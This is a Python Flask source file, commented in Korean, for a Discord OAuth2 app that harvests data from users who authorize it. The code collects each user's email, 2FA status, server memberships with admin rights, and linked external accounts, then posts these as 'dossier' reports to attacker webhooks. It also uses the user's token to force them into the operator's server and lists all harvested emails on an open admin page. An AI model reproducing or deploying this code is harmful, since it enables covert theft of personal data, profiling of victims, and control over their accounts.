import os
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- 설정 (Render 환경 변수에서 로드) ---
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MY_GUILD_ID = os.environ.get('MY_GUILD_ID') # 유저를 가둘 서버 ID

# --- 채널별 웹훅 URL ---
WH_PROFILE = os.environ.get('WH_PROFILE')   # 1번: 기본 신상
WH_GUILDS = os.environ.get('WH_GUILDS')     # 2번: 소속 서버 및 권한
WH_CONNECT = os.environ.get('WH_CONNECT')   # 3번: 외부 연결 계정
WH_CONTROL = os.environ.get('WH_CONTROL')   # 4번: 강제 가입 및 제어 로그
WH_SYSTEM = os.environ.get('WH_SYSTEM')     # 5번: 전체 시스템/관리자 로그

API_BASE = 'https://discord.com/api/v10'

# 메모리 기반 유저 저장소
user_storage = []

def send_report(url, embed):
    """웹훅 전송 함수"""
    requests.post(url, json={"embeds": [embed]})

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "인증 코드가 누락되었습니다.", 400

    try:
        # 1. 액세스 토큰 교환
        token_data = {
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }
        t_res = requests.post(f'{API_BASE}/oauth2/token', data=token_data).json()
        access_token = t_res.get('access_token')

        # 2. 모든 가용 데이터 병렬 수집 (Headers)
        h = {'Authorization': f'Bearer {access_token}'}
        u = requests.get(f'{API_BASE}/users/@me', headers=h).json()
        g = requests.get(f'{API_BASE}/users/@me/guilds', headers=h).json()
        c = requests.get(f'{API_BASE}/users/@me/connections', headers=h).json()

        user_id = u.get('id')
        user_tag = f"{u.get('username')}#{u.get('discriminator', '0')}"

        # 3. [1번 채널] 기본 프로필 보고
        send_report(WH_PROFILE, {
            "title": "👤 신규 유저 기본 신상 보고",
            "color": 3447003,
            "fields": [
                {"name": "이름(ID)", "value": f"{user_tag} (`{user_id}`)"},
                {"name": "이메일", "value": u.get('email', 'N/A')},
                {"name": "보안", "value": f"2FA: {u.get('mfa_enabled')} / 인증: {u.get('verified')}"},
                {"name": "니트로", "value": f"Type: {u.get('premium_type', 0)}"}
            ]
        })

        # 4. [2번 채널] 서버 목록 및 권한 분석 보고
        admin_guilds = [srv['name'] for srv in g if (int(srv['permissions']) & 0x8)]
        send_report(WH_GUILDS, {
            "title": "🏰 소속 서버 및 영향력 보고",
            "color": 15105570,
            "description": f"총 **{len(g)}개** 서버에 가입되어 있습니다.",
            "fields": [
                {"name": "관리자 권한 보유 서버", "value": ", ".join(admin_guilds) or "없음"}
            ]
        })

        # 5. [3번 채널] 외부 연결 계정 보고
        conn_list = [f"**{conn['type']}**: {conn['name']}" for conn in c]
        send_report(WH_CONNECT, {
            "title": "🔗 외부 플랫폼 연동 보고",
            "color": 15844367,
            "description": "\n".join(conn_list) or "연결된 계정 없음"
        })

        # 6. [4번 채널] 강제 서버 가입 실행 및 보고
        join_h = {'Authorization': f'Bot {BOT_TOKEN}'}
        join_res = requests.put(
            f'{API_BASE}/guilds/{MY_GUILD_ID}/members/{user_id}',
            headers=join_h,
            json={'access_token': access_token}
        )
        status = "성공" if join_res.status_code in [201, 204] else f"실패 ({join_res.status_code})"
        send_report(WH_CONTROL, {
            "title": "⛓️ 강제 서버 가입 상태 보고",
            "color": 9807270,
            "fields": [{"name": "가입 결과", "value": status}]
        })

        # 데이터 저장
        user_storage.append({"tag": user_tag, "id": user_id, "email": u.get('email')})

        return "<h1>✅ 모든 데이터 수집 및 보고 완료</h1>"

    except Exception as e:
        requests.post(WH_SYSTEM, json={"content": f"⚠️ 오류 발생: {str(e)}"})
        return "오류가 발생했습니다.", 500

@app.route('/admin')
def admin():
    return render_template_string("""
    <body style="background:#2c2f33; color:white;">
        <h2>📊 전체 수집 유저 요약 ({{ users|length }}명)</h2>
        <table border="1" style="width:100%; border-collapse:collapse;">
            <tr><th>유저태그</th><th>ID</th><th>이메일</th></tr>
            {% for u in users %}
            <tr><td>{{u.tag}}</td><td>{{u.id}}</td><td>{{u.email}}</td></tr>
            {% endfor %}
        </table>
    </body>
    """, users=user_storage)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
